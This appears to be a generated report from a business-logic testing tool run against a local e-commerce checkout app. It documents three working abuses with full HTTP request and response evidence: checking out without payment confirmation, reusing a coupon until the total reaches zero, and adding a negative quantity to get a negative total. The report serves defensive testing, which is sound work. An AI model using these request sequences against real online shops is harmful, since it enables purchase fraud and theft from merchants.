# FlowBreak Results - ecommerce_checkout

Generated: 2026-10-08T08:07:53.460344+00:00

**3 of 3 techniques found a rule violation.**

## [VULNERABLE] step_skip - Replay workflow with step 'payment_confirm' omitted

- Rule `no_order_without_payment` (`order.status != "complete" or payment.confirmed == True`): **VIOLATED**
- Rule `coupon_single_use` (`coupon.redeemed_count <= 1`): **held**
- Rule `no_negative_total` (`order.total > 0`): **held**

<details><summary>Evidence (request/response chain)</summary>

**add_to_cart** — normal replay

```
POST http://localhost:8099/cart/add
{
  "product_id": 1,
  "quantity": 2
}

-> 200
{
  "item_count": 2,
  "total": 20.0
}
```

**apply_coupon** — normal replay

```
POST http://localhost:8099/cart/coupon
{
  "code": "SAVE5"
}

-> 200
{
  "redeemed_count": 1,
  "total": 15.0
}
```

**checkout** — final step after skip

```
POST http://localhost:8099/checkout
{}

-> 200
{
  "status": "complete",
  "total": 15.0
}
```

</details>

## [VULNERABLE] repeat_abuse - Replay step 'apply_coupon' 3x beyond normal flow

- Rule `no_order_without_payment` (`order.status != "complete" or payment.confirmed == True`): **held**
- Rule `coupon_single_use` (`coupon.redeemed_count <= 1`): **VIOLATED**
- Rule `no_negative_total` (`order.total > 0`): **could not evaluate (rule references a value this technique never produced ('>' not supported between instances of 'NoneType' and 'int'))**

<details><summary>Evidence (request/response chain)</summary>

**add_to_cart** — normal replay

```
POST http://localhost:8099/cart/add
{
  "product_id": 1,
  "quantity": 2
}

-> 200
{
  "item_count": 2,
  "total": 20.0
}
```

**apply_coupon** — normal replay

```
POST http://localhost:8099/cart/coupon
{
  "code": "SAVE5"
}

-> 200
{
  "redeemed_count": 1,
  "total": 15.0
}
```

**apply_coupon** — repeat attempt #1 (abuse)

```
POST http://localhost:8099/cart/coupon
{
  "code": "SAVE5"
}

-> 200
{
  "redeemed_count": 2,
  "total": 10.0
}
```

**apply_coupon** — repeat attempt #2 (abuse)

```
POST http://localhost:8099/cart/coupon
{
  "code": "SAVE5"
}

-> 200
{
  "redeemed_count": 3,
  "total": 5.0
}
```

**apply_coupon** — repeat attempt #3 (abuse)

```
POST http://localhost:8099/cart/coupon
{
  "code": "SAVE5"
}

-> 200
{
  "redeemed_count": 4,
  "total": 0.0
}
```

</details>

## [VULNERABLE] field_tamper - Replay step 'add_to_cart' with quantity tampered to -5

- Rule `no_order_without_payment` (`order.status != "complete" or payment.confirmed == True`): **held**
- Rule `coupon_single_use` (`coupon.redeemed_count <= 1`): **held**
- Rule `no_negative_total` (`order.total > 0`): **VIOLATED**

<details><summary>Evidence (request/response chain)</summary>

**add_to_cart** — tampered request

```
POST http://localhost:8099/cart/add
{
  "product_id": 1,
  "quantity": -5
}

-> 200
{
  "item_count": -5,
  "total": -50.0
}
```

**apply_coupon** — normal replay

```
POST http://localhost:8099/cart/coupon
{
  "code": "SAVE5"
}

-> 200
{
  "redeemed_count": 1,
  "total": 0.0
}
```

**payment_confirm** — normal replay

```
POST http://localhost:8099/payment/confirm
{}

-> 200
{
  "confirmed": true
}
```

**checkout** — normal replay

```
POST http://localhost:8099/checkout
{}

-> 200
{
  "status": "complete",
  "total": 0.0
}
```

</details>
